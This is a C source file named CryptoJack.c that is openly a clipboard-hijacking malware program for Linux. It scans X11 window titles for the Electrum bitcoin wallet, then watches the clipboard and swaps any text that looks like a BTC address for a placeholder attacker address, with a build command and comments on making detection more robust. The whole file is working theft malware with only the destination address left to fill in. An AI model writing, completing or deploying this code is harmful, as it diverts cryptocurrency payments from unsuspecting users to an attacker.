#include <gtk/gtk.h>
#include <stdio.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>

//gcc CryptoJack.c `pkg-config --cflags --libs gtk+-3.0` -lX11
 
gboolean timeout_callback(gpointer data) {
	gtk_main_quit();
	return FALSE;
}

// Will constantly check clipboard contents awaiting a BTC wallet address
void ChangeClipboardContent() {
	gtk_init(NULL, NULL);
	while (1) {
		printf("[+] Grabbing clipboard data...\n");
		GtkClipboard *clipboard = gtk_clipboard_get(GDK_SELECTION_CLIPBOARD);
	
		gchar *text = gtk_clipboard_wait_for_text(clipboard);
		if (text != NULL) {
			// Check the clipboard contents to see if it's a potential BTC wallet address
			// TODO: Implement a more robust checking mechanism
			// First we check to see if it's between 34 & 62 characters long
			if (strlen(text) >= 34 && strlen(text) <= 62) {
				printf("[+] Length check passed!\n");
				// Second we check if it begins with 1, 3, or bc1 as wallet addresses typically do
				if (strncmp(text, "bc1", strlen("bc1")) == 0 || strncmp(text, "1", strlen("1")) == 0 || strncmp(text, "3", strlen("3")) == 0) {
					printf("[+] Prefix check passed! Swapping out wallet address\n");
					gtk_clipboard_set_text(clipboard, "NewWalletAddress", -1);
					g_free(text);
					// Cleaner method of doing this: https://stackoverflow.com/questions/52204996/how-do-i-use-clipboard-in-gtk#52205063
					g_timeout_add_seconds(1, timeout_callback, NULL);
					gtk_main();
					printf("[+] Modified clipboard contents!\n");
					return;
				} else {
					printf("[!] Prefix check didn't pass! Assuming it isn't a wallet address...\n");
					return; // Remove return to keep checking if prefix check fails
				}
			} else {
				printf("[!] Length check didn't pass! Assuming it isn't a wallet address...\n");
				return; // Remove return to keep checking if length check fails
			}
			//g_print("[+] Detected clipboard text: %s\n", text);
			
			g_free(text);
		}
	}
}


// Check for any BTC wallet windows
// Default target: Electrum
void CheckWindowTitles() {

	Display *display;
	Window rootWin;
	Window *windows;
	unsigned int WindowCt;

	display = XOpenDisplay(NULL);
	if (display == NULL) {
		printf("[!] Error grabbing handle to XDisplay!\n");
		return;
	}

	rootWin = DefaultRootWindow(display);
	if (!XQueryTree(display, rootWin, &rootWin, &rootWin, &windows, &WindowCt)) {
		printf("[!] Unable to query window tree!\n");
		return;
	}

	printf("[+] Looping through all windows...\n");
	for (unsigned int i=0; i < WindowCt; i++) {
		char *windowName;
		XFetchName(display, windows[i], &windowName);
		if (windowName != NULL) {
			printf("%s\n", windowName);
			if (strstr(windowName, "Electrum") != NULL) {
				printf("[+] Electrum window found!\n");
				ChangeClipboardContent();
			}
			XFree(windowName);		
		}
	}

}

int main() {
	CheckWindowTitles();	
}
